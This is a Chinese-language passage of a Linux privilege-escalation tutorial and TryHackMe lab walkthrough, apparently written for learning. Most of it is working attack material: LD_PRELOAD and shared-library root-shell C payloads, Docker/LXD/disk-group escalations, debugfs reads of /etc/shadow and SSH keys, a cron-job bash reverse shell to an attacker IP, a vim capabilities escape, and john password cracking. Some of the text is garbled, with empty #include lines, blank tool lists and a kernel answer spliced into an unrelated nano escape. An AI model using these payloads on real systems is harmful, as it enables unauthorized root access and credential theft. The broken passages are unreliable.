>
> 此外，`LD_PRELOAD`环境变量可以在执行二进制文件之前加载库。此库中的函数优先于默认函数。
提权的先遣条件，被劫持的命令或程序必须具有较高的权限（以root运行、SUID或SUDO等）。同时在`/etc/sudoers`文件中需要定义`env_keep+=LD_PRELOAD`
  1. 确认一个可以用高权限执行的程序或命令
  2. 编写脚本，c语言等
        #include 
    #include 
    #include 
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }
对其编译为`.so`动态文件，`gcc -fPIC -shared -o root.so root.c -nostartfiles`
  3. 高权限运行程序或命令，指定对应的恶意文件库，`sudo LD_PRELOAD=/tmp/root.so 程序或命令`
### 共享对象劫持提权
不同于共享库提权，针对于新开发的程序和二进制可执行文件。
  1. `ldd 程序`查看其所使用的共享对象文件和共享库
  2. 找到其程序利用的非标准库依赖
  3. 利用`readelf -d 程序 | grep PATH`查看程序自定义的共享库位置
  4. 找到自定义的共享库位置，自建链接库的文件到该共享库文件夹，执行程序查看是否缺少函数
  5. 创建.c文件，自定义这个函数名，设置uid为root，利用其执行bash或sh
        #include
    #include
    void 函数名() {
        setuid(0);
        system("/bin/sh -p");
    }
  6. 编译文件为动态链接文件`gcc c文件 -fPIC -shared -o /共享库/共享对象文件`
  7. 执行即可反弹shell
### 利用特权组提权
  1. 利用id显示看一下用户所在的特权组  
例如  
  2. 根据特权组判断使用的提权方法
#### LXC/LXD提权
> lxc（Linux container），Linux自带的容器；
>
> lxd，简单地说，LXD 就是一个提供了 REST API 的 LXC 容器管理器
>
>
> LXD是Linux系统中用于管理LXC容器的API，提供了很多便利的命令来创建容器（container）、启动等等操作。它将为本地lxd用户组的任何用户执行任务，然而并没有在用户的权限与要执行的功能之间是否匹配做过多的判断。
  * LXC的特权容器挂载系统目录  
启动LXD初始化，选项默认即可  
导入`lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`本地镜像（例子）  
启动`security.privileged`为true的特权容器，启动没有UID映射的容器，使得容器中root用户与主机上的root用户相同`lxc
init alpine r00t -c security.privileged=true`  
挂载主机文件系统`lxc config device add r00t mydev disk source=/ path=/mnt/root
recursive=true`  
在容器中启动shell`lxc start r00t`和`lxc exec r00t /bin/sh`就可以以root身份连接到文件系统
  * 例如：一个低权限的用户能够创建一个用于host和container通信的socket，当将host中已经创建的一个socket和container绑定后，它们之间的连接通信会以LXD服务的凭证（root权限）而不是调用用户的凭证；所以当container中发送socket和host通信时，此时host端的socket则是root权限。  
具体复现查看[Linux Privilege Escalation via LXD & Hijacked UNIX Socket
Credentials](https://shenaniganslabs.io/2019/05/21/LXD-LPE.html)和中文[复现讲解](https://www.anquanke.com/post/id/179407)还有自动化利用[脚本](https://github.com/initstring/lxd_root)
#### Docker提权
docker组的本质就是无密码root身份访问主机文件
利用命令`docker run -v /root:/mnt -it
ubuntu`可以创建一个新的docker实例，以主机的`/root`目录作为系统卷启动。
容器启动后可以查看该目录内容或添加ssh密钥，更改为其他目录均可，可以结合/etc/shadow破解或添加sudoers等。
#### Disk提权
Disk组用户对`/dev`目录具有root权限
利用`debugfs -rw /dev/sda2`可以利用debugfs的root权限访问文件系统
    debugfs -rw /dev/sda2
    debugfs: cd /root
    debugfs: ls
    debugfs: cat /root/.ssh/id_rsa
    debugfs: cat /etc/shadow
#### ADM提权
ADM组在Linux中用于系统监控任务，组内的用户可以读取`/var/log`的日志文件。
主要用来收集存储在日志文件中的敏感数据或枚举用户操作和运行 CronJobs。
## Linux的加固
### 更新和补丁
老版本的Linux内核和内置命令或第三方服务，通常存在利用条件简单的提权漏洞。对这些服务的定期更新和删除使用会避免一部分提权行为。
### 配置管理
  1. 自查主机内的可写文件、目录和使用SUID、SGID设置的可执行文件
  2. 确保所有的CronJob和sudo权限的分配都使用绝对路径指定可执行文件
  3. 不将任何凭证以明文方式存储在低权限用户可读的文件中
  4. 及时清理目录的文件和bash历史
  5. 确保低权限用户不能修改程序调用的任何自定义共享库
  6. 删除任何可能增加攻击面的软件和服务
### 用户管理
  1. 限制主机用户和管理员账户的数量
  2. 记录和监控对于登陆的尝试，无论成功与否
  3. 利用PAM模块的`/etc/security/opasswd`执行强密码策略、定期更换密码和限制用户重复使用旧密码操作。
  4. 避免用户被分配到日常任务所不必需的权限组，尽可能以最小权限原则分配限制sudo权限
  5. 便于管理可以使用自动化配置管理工具等
## 关于Linux提权的工具
**一、本地扫描工具**
  * 
  * 
  * 
  * 
**二、内核漏洞查询**
  * searchsploit
    * searchsploit linux 2.6 ubuntu priv esc
    * searchsploit Privilege Escalation
  * 其他工具
**三、其他综合工具**
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
## THM的模块内容
### Enumeration
  1. What is the hostname of the target system?  
  2. What is the Linux kernel version of the target system?  
  3. What Linux is this?  
  4. What version of the Python language is installed on the system?  
可以利用python自带的`python -V`查看系统版本  
  5. What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)  
利用任意方法搜索漏洞即可，一般可以利用`searchsploit`搜索
`searchsploit 3.13`  
利用其中`Linux Kernel **3.13**.0  It can be used to break out from restricted environments by spawning an
> interactive system shell.
>
>     * nano  
>  ctrl r + ctrl x  
>  reset; sh 1>&0 2>&0
提权成功  
shadow文件中复制hash值即可  
### Privilege Escalation: SUID
  1. Which user shares the name of a great comic book writer?  
`cat /etc/passwd`可以看到`gerryconway`这个用户
  2. What is the password of user2?  
利用命令`find / -type f -perm -04000 -ls 2>/dev/null`  
可以看到`base64`在`SUID`和`GUID`权限，可以利用`./base64 "$LFILE" | base64
--decode`命令去读取shadow文件  
利用`unshadow`工具破解hash值  
创建passwd和shadow文件  
利用`unshadow PASSWORD-FILE SHADOW-FILE > PASSWORD`集成为一个文件  
使用`john the ripper`破解`john --wordlist=/usr/share/wordlists/rockyou.txt
PASSWORD`密码为Password1
  3. What is the content of the flag3.txt file?  
使用`base64 /home/ubuntu/flag3.txt | base64 --decode`可以看到flag值  
### Privilege Escalation: Capabilities
  1. How many binaries have set capabilities?  
输入`getcap -r / 2>/dev/null`  
  2. What other binary can be used through its capabilities?  
view
  3. What is the content of the flag4.txt file?  
输入`./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c",
"reset; exec sh")'`就可以打开一个终端  
`cat /home/ubuntu/flag4.txt`获取flag值
### Privilege Escalation: Cron Jobs
  1. How many user-defined cron jobs can you see on the target system?  
在`/etc/crontab`中有四个计划任务  
  2. What is the content of the flag5.txt file?  
需要利用crontab反弹一个root的shell，在目标主机的nc命令没有-e参数，所以尝试用bash/sh反弹shell  
此目标机存在`bash`命令，所以直接修改`back.sh`
修改back.sh添加`bash -i >& /dev/tcp/操作机ip/监听端口 0>&1`（记得给back.sh添加执行权限  
稍等片刻即可反弹到root的shell  
flag5.txt在`/home/ubuntu/`目录下，直接查看即可
  3. What is Matt's password?  
依旧利用unshadow和john命令去破解/etc/passwd和/etc/shadow两个文件内容  
### Privilege Escalation: PATH
  1. What is the odd folder you have write access for?  
输入命令`find / -writeable 2>/dev/null`查看可写目录，根据Hint可知是home目录下  
  2. Exploit the $PATH vulnerability to read the content of the flag6.txt file.  
flag文件在`/home/matt`目录下
    * 直接使用命令读取flag  
在`/home/murdoch`目录下，有两个文件  
thm.py的文件内容为  
尝试执行tset文件时提示  
所以我们需要自建一个thm文件  
添加当前目录或tmp目录到PATH均可，输入命令`echo "cat /home/matt/flag6.txt" > thm`  
    * 反弹root的shell  
将thm文件的内容改成`/bin/bash`  
  3. What is the content of the flag6.txt file?  
步骤同上
### Privilege Escalation: NFS
  1. How many mountable shares can you identify on the target system?  
输入命令`cat /etc/exports`  
  2. How many shares have the "no_root_squash" option enabled?  
三个可挂载目录都开启了`no_root_squash`
  3. Gain a root shell on the target system  
选择任意目录挂载在攻击机中，利用c语言脚本提权  
编写脚本，`gcc 脚本 -o 程序`，添加suid权限和执行权限
        #include
    void main()
    {
            setuid(0);
            setgid(0);
            system("/bin/bash");
    }
  4. What is the content of the flag7.txt file?  
root的shell直接`cat /home/matt/flag7.txt`
### Capstone Challenge
提权路径
命令`uname -a`查看内核版本
`searchsploit`搜索一下内核版本，有一个可利用的漏洞`Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat
/ Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege
Escalation`，目标机器也有gcc工具  
也可以利用dirtycow提权，均未成功利用
命令`sudo -l`没有任何的sudo权限
crontab无信息
也没有后台运行的短时cron脚本
利用`find / -type f -perm -04000 -ls 2>/dev/null`查看SUID权限的工具，可以看到之前的base64工具